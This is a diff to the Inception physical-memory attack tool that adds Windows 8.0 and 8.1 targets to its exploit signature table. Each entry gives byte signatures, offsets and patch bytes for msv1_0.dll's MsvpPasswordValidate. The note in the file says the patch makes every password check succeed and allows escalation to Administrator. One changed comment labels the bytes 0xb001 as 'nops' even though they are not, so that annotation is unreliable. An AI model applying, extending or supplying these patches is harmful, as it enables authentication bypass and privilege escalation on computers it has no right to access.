@@ -27,7 +27,7 @@ from textwrap import TextWrapper
 #===============================================================================
 # General information
 #===============================================================================
-version = '0.3.0'
+version = '0.3.1'
 url = 'http://breaknenter.org/projects/inception'
 
 #===============================================================================
@@ -148,16 +148,21 @@ termwidth = 80                  # Default terminal size is 80 chars wide
 #===============================================================================
 
 targets = [{'OS': 'Windows 8',
-            'versions': ['SP0'],
+            'versions': ['8.0', '8.1'],
             'architectures': ['x86', 'x64'],
             'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
             'notes': 'Ensures that the password-check always returns true. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
-            'signatures': [{'offsets': [0xde7], # x86 SP0 
+            'signatures': [{'offsets': [0xde7], # x86 8.0
                             'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
                                         'internaloffset': 0x00,
-                                        'patch': 0xb001, # mov al,1
-                                        'patchoffset': 0xc1}]},
-                           {'offsets': [0x208], # x64 SP0
+                                        'patch': 0xb001, # nops
+                                        'patchoffset': 0xc1}]}, # 0xc1
+                           {'offsets': [0xca0], # x86 8.1
+                            'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x909090909090, # nops
+                                        'patchoffset': 0xb3}]},
+                           {'offsets': [0x208, 0xd78], # x64 8.0, 8.1
                             'chunks': [{'chunk': 0xc60f85,
                                         'internaloffset': 0x00,
                                         'patch': 0x909090909090,
